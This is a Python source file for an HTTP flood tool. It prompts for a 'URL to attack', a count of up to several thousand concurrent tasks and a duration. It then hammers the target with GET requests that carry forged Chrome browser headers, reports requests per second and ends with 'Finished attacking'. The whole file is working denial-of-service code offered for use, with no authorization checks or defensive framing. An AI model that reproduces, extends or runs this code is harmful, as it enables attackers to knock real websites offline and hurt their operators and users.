import subprocess
import time
import copy
import os
import asyncio
import sys
from argparse import ArgumentParser
from typing import TypeVar, Any, Callable
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse

if os.name == "nt":
    asyncio.set_event_loop(asyncio.ProactorEventLoop())
    # This is required for windows to be able to open more than like 500 sockets.

parser = ArgumentParser()
parser.add_argument("--install", action="store_true", help="Installs the dependencies")
parser.add_argument("-q", "--quiet", action="count", help="Lessens output.", default=0, dest="q")
parser.add_argument("--timeout", action="store", type=float, help="Timeout connection", default=60.0)

args = parser.parse_args()

if args.install is True:
    print("Installing dependencies...")
    reqs = Path(__file__).parent / "requirements.txt"
    executable = sys.executable
    if sys.platform != "win32":
        venv_path = Path(__file__).parent / "venv" / "bin" / "python3"
    else:
        venv_path = Path(__file__).parent / "venv" / "Scripts" / "python.exe"

    if venv_path.exists():
        executable = venv_path
        print("Notice: Using the virtual environment located at {!s}.".format(venv_path.parent.parent))
        subprocess.run(
            (executable, "-m", "pip", "install", "-Ur", str(reqs.absolute()))
        )
    else:
        subprocess.run(
            (executable, "-m", "pip", "install", "--user", "-Ur", str(reqs.absolute()))
        )
    print("Done")
    sys.exit(0)


try:
    import aiohttp
except ModuleNotFoundError:
    aiohttp = None
    print("Please install aiohttp.")
    sys.exit(1)

try:
    import brotli
except ImportError:
    brotli = None


INSECURE_BROWSER_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,"
    "application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/96.0.4664.45 Safari/537.36",
}
SECURE_BROWSER_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,"
    "application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate, ",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/96.0.4664.45 Safari/537.36",
}


def get_input(prompt=None, *, func: Callable[[str], Any] = str, func_name: str = None) -> Any:
    while True:
        x = input(prompt)
        # noinspection PyBroadException
        try:
            return func(x)
        except Exception:
            fn = func_name or func.__name__
            print("Failed to convert input to expected type %r. Try again." % fn)


start_event = asyncio.Event()
sent_requests = 0


def shorten(text: str, max_length: int = 0):
    if max_length == 0:
        term_size = os.get_terminal_size()
        max_length = term_size.columns // 2

    if len(text) > max_length:
        return text[: max_length - 3] + "..."
    return text


async def counter_task():
    while True:
        before = copy.copy(sent_requests)
        await asyncio.sleep(1.0)
        after = copy.copy(sent_requests)
        counter = after - before
        print("(RPS)  || %s/s" % counter)


async def main_task(target: str, task_id: int, end_at: float = None):
    if end_at is None:

        def end():
            return False

    else:

        def end():
            return time.time() >= end_at

    await start_event.wait()

    headers = (
        SECURE_BROWSER_HEADERS
        if target.startswith("https")
        else INSECURE_BROWSER_HEADERS
    )
    async with aiohttp.ClientSession(headers=headers, timeout=aiohttp.ClientTimeout(connect=args.timeout)) as client:
        global sent_requests
        while not end():
            if args.q < 1:
                print("({}) <= GET {}".format(str(task_id).zfill(4), target))
            try:
                sent_requests += 0.5
                async with client.get(target) as response:
                    sent_requests += 0.5
                    if args.q < 2:
                        print(
                            "({}) => GET {} - {!s} {!s}".format(
                                str(task_id).zfill(4),
                                shorten(target, 12),
                                response.status,
                                response.reason,
                            )
                        )
                    try:
                        await response.content.read(
                            max(1, min(task_id, 100))
                        )  # read a few bytes but do nothing with them.
                        # Theoretically, this means that the server will return the payload straight away
                        # Rather than deferring it until the response asks for it.
                        # This way, the server does not discard the data after the requests
                    except Exception:
                        pass
            except (RuntimeError, KeyboardInterrupt):
                return
            except aiohttp.ServerTimeoutError:
                sent_requests -= 0.5
                if args.q < 3:
                    print(
                        "({}) !! GET {} - Timeout".format(
                            str(task_id).zfill(4), shorten(target, 12)
                        )
                    )
            except aiohttp.ClientConnectionError:
                # This is fine, ignore it
                continue
            except Exception as e:
                sent_requests -= 0.5
                if args.q < 3:
                    print(
                        "({}) !! GET {} - Error: {!r}".format(
                            str(task_id).zfill(4), shorten(target, 12), e
                        )
                    )
        return


tasks = []


def pretty_time(seconds: int):
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    if hours:
        format_string = "{hours}h {minutes}m {seconds}s"
    else:
        format_string = "{minutes}m {seconds}s"
    return format_string.format(hours=hours, minutes=minutes, seconds=seconds)


async def main():
    global tasks
    while True:
        url = get_input("URL to attack: ", func=urlparse, func_name="URL")
        if not url.scheme.startswith("http"):
            print("Target must be a http(s) url. Try again.")
        else:
            break
    thread_count = get_input("How many tasks should be started? ", func=int)
    if thread_count < 0 or thread_count >= 10000:
        thread_count = 100
    max_time = (
        get_input(
            "How long, in seconds, should this attack last? (set to 0 to disable) ",
            func=int,
        )
        or None
    )
    if max_time:
        max_time = time.time() + max_time
    for i in range(thread_count):
        task = asyncio.ensure_future(
            main_task(
                str(url.geturl()),
                i,
                max_time,
            )
        )
        tasks.append(task)

    if brotli is None:
        print(
            "Warning: Websites that serve content compressed with brotli will cause errors."
        )
        print("You should run `main.py install`.")

    try:
        input("Ready to fire. Just press enter. ")
    except (KeyboardInterrupt, EOFError):
        print("cancelled.")
        return
    start_time = datetime.now()
    try:
        print("Starting.")
        start_event.set()
        timer_task = asyncio.ensure_future(counter_task())
        await asyncio.gather(*tasks)
        timer_task.cancel()
    except KeyboardInterrupt:
        print("Cancelled.")
    finally:
        try:
            # noinspection PyUnboundLocalVariable
            timer_task.cancel()
        except NameError:
            pass
        end_time = datetime.now()
        print("Finished attacking %s!" % url.geturl())
        print(
            "Sent %s requests in %s"
            % (sent_requests, pretty_time(int((end_time - start_time).total_seconds())))
        )


if sys.version_info < (3, 7):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()
else:
    try:
        asyncio.run(main())
        print("Exited.")
    except KeyboardInterrupt:
        print("Exited.")
